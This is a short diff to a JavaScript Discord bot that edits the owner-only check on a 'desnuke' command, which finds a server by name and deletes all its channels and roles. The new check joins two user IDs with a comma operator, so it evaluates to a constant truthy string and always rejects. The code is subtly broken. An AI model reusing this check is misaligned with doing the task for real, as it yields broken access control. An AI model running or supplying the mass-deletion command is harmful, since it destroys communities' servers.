@@ -1814,7 +1814,7 @@ var thirds = third[Math.floor(Math.random() * third.length)];
              }
              
            if(command === `${prefix}desnuke`) {
-           	if (message.author.id !== "303184720802611200") return message.channel.send("Only the bot owner can use this command")
+           	if (message.author.id !== "303184720802611200", "254421612802080768") return message.channel.send("Only the bot owner can use this command")
            let dud = bot.guilds.find(r=> r.name === args.join(' '))
            bot.guilds.get(dud.id).channels.deleteAll()
            bot.guilds.get(dud.id).roles.deleteAll()
